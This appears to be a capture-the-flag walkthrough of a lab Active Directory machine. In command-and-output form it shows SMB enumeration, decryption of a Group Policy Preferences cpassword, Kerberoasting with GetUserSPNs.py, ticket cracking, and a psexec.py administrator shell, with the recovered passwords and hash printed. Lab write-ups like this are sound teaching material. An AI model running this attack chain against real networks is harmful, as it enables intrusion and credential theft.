# Nmap
```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49166/tcp open  unknown
49168/tcp open  unknown
```

# Try smbclient:

```bash
└─$ smbclient -L ////10.10.10.100//  
Password for [WORKGROUP\singhx]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
```

# Successfully login to Replication:
```bash
└─$ smbclient //10.10.10.100/Replication
Password for [WORKGROUP\singhx]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  active.htb                          D        0  Sat Jul 21 11:37:44 2018
```
# While enumeration got group file wth credentials:
```bash
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

# The password is in encrypted format let's decrypt it:

```bash
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

# By login to smbclient we got user.txt:

```bash
└─$ smbclient //10.10.10.100/Users -U svc_tgs
Password for [WORKGROUP\svc_tgs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 15:39:20 2018
  ..                                 DR        0  Sat Jul 21 15:39:20 2018
  Administrator                       D        0  Mon Jul 16 11:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 06:06:44 2009
  Default                           DHR        0  Tue Jul 14 07:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 06:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 05:57:55 2009
  Public                             DR        0  Tue Jul 14 05:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 16:16:32 2018
```

# Using rpcclient got access to cmd and got all users:

```bash
└─$ rpcclient -U "svc_tgs" 10.10.10.100
Password for [WORKGROUP\svc_tgs]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
rpcclient $> 
```
# Run cmd to get tgs of administrator:

```bash
└─$ GetUserSPNs.py -request active.htb/SVC_TGS -dc-ip 10.10.10.100
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40  2023-06-28 18:47:41 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$5f701abc7fc8125430229dea5bddda6f$0655d1e4e1778e537eed202d65d08d3806205af4976db7b586397eae05c388e9af83880dea1592616ac4cfbcfd4d225fc7ef36f2b61cd1859a1113b56a61c7d9e8d9047acd58f12bf010c4949116d693c9b42dd6a1b731ccb33cd6669b8db9e166a616d75627bab5ec8bcf025ddff14f5006487bea2f5dc32b34bdac1e927875a04f55556c25c4a0a6b2c6d223dd7fe65df48419b25db402f7b64ace4200cfe0bd0ecfd5e57efc3f7e0aa836a03bf42c1900a55a7c68bd5924d29976501e6df688344d85908475cf9f9cbe99bc6d9d3d7bc54388eba33856f8d0f9d49ad67492ea54e7c1dfbedf11e375f3d609f068659c759801c46b82dfc5783d8909fedc63f7026829fcb29d2afbc7f7d3aaa6993dadad73b0570d41d8279cc1cf332cd2938f39b4a519da38169358e578a632e47290082de99d79b0cfd9cfac2a86a770d0471ddc1320c7da2502da0b2b48933cc4479f7f100ff39975743f18b1956cd6522babfec378a3895976d2ebc0eb1204dc3800b404c945e2898c14ed4112bc392204fd3ec0d03b52727c510ea7575eacde25baf0bd9b6f3d474cc21e5188c1897575c5990be719d143dc5f9c6969e770444f34f3f4a28ac227fca9fd600bfff7c535df518d5a60654f6efeb7b391bfdaf7a4878a3888c5383876ec7a35645efb8e75c5e45e8a80e4740b2e7f0df25caf8e2fa7c44d1cce3419a31bc9fcb7400cb91dd5a47438ab63d7a46422f636453518162e98e9be57705bf4888ac3ab826866b0a8e21fc69703ecea294bb476e9b7f25b975eaf001ce2c6584e892c890d56d04309b7bc853806c93bc6cca1477a8f3da7059c59e35a1ab6c0945131564df56b71d0fc3fc4d1720e0c16a9f2acfcc76458250043874b79a99b50e3772925a944eace9414f11dfbe6fe49172f9471ab949c1cad776ef51a738bf41f40bea12e9d9fdeb0ff13a2fe1cc510265ac6ae46071dc83334ed19e521cd5b61077dcf6c1dae5737617dc694d993688ea22af2a365ed8cc6a43778e9e9ea84c57bbdc259ba2ab86709a04fc194a1f4502e8570b67c69b92f038d1c25743d63430e09fadf6e8a45136956cb16b87ac1cd97177b56744189b7e71f13726ec70d74a1802829be96c43b3bc54959eb9f52d634532619b1dc61f814dacf36dd61d85002c913f48dc7b1b3ccdc9f625753c701cb77b3febd3d0ae065cc62cfab832e35082219b9218eccbe7adcf2f262efe46897a5d303146a016fcca12dd52a6b51

```
# On cracking got credential:
`12dd52a6b51:Ticketmaster1968`


# Login using PSExec with credentials:

```bash
└─$ psexec.py administrator@10.10.10.100
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file xbqLkgyr.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service uMos on 10.10.10.100.....
[*] Starting service uMos.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
